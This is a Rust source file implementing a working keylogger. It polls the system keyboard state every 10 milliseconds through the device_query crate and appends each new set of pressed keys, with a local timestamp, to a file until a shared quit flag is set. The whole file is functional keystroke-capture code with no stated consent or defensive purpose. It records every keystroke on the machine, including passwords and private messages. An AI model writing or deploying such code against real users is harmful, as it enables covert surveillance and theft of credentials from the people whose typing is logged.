use chrono::prelude::*;
use device_query::{DeviceQuery, DeviceState};
use std::fs::OpenOptions;
use std::io::Write;
use std::sync::{Arc, Mutex};
use std::{thread, time};

pub struct Keylogger
{
    pub quit: bool,
}

/// Keylogger launch function
/// * path - a path where key logger data will be stored
/// * key_logger_data - a reference to KeyLogger strcture
pub fn run(path: String, key_logger_data: Arc<Mutex<Keylogger>>) 
{
    let device_state = DeviceState::new();

    let mut prev_keys = vec![];

    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(path)
        .expect("Failed to open file");

    loop 
    {
        let local: DateTime<Local> = Local::now();

        let keys = device_state.get_keys();
        
        if keys != prev_keys && !keys.is_empty() 
        {
            writeln!(file, "[{:?}] [Keyboard] {:?}", local, keys).expect("Failed to write to a file");
        }
        
        prev_keys = keys;

        let val = key_logger_data.lock().unwrap().quit;
        if val
        {
            break;
        }

        drop(val);

        let ten_millis = time::Duration::from_millis(10);
        thread::sleep(ten_millis);
    }
}